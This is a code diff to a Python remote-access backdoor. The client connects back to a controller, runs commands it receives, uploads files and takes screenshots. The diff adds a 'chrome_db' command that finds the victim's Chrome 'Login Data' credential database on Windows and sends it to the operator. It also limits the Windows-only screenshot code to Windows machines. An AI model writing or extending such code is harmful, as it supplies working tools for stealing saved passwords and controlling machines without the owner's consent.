@@ -23,9 +23,12 @@ import platform
 import time
 import re
 
-from mss.windows import MSS as mss
-
-sct = mss()
+if os.name == "nt":
+    import ctypes
+    from mss.windows import MSS as mss
+    sct = mss()
+else:
+    pass
 
 HOST = '127.0.0.1'
 PORT = int('8000')
@@ -65,6 +68,7 @@ def download(command):
 def upload(command):
     if "screenshot() download " in command:
         fileName = command.replace("screenshot() download ", "")
+
     else:
         fileName = command.replace("download ", "")
     try:
@@ -85,11 +89,23 @@ def upload(command):
         main()
 
 def screenshot(command):
-    fileName = command.replace("screenshot() ", "")
-    for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
-        pass
-    upload(command)
+    if os.name == "nt":
+        fileName = command.replace("screenshot() ", "")
+        for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
+            pass
+        upload(command)
+    else:
+        s.sendall("[!] This func, works only on Windows!\n")
+        main()
 
+def chrome_db():
+    global db_name
+    if os.name == "nt":
+        db_name = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+        upload("download %s"%(db_name))
+    else:
+        s.sendall("[!] This func, works only on Windows!\n")
+        main()
 
 def messageBox(text):
     title = text
@@ -141,11 +157,14 @@ def main():
         elif "upload" in command:
             download(command)
 
-        elif "download" in command and "screenshot()" not in command:
+        elif "download" in command and "screenshot()" not in command and "chrome_db" not in command:
             upload(command)
 
         elif "screenshot()" in command:
             screenshot(command)
+
+        elif command == "download chrome_db":
+            chrome_db()
 
         elif "execute" in command:
             command = command.replace("execute ", "")
@@ -173,7 +192,8 @@ def start():
         try:
             connect()
             main()
-        except:
+        except Exception as e:
+            print e
             start()
 
 if __name__ == "__main__":
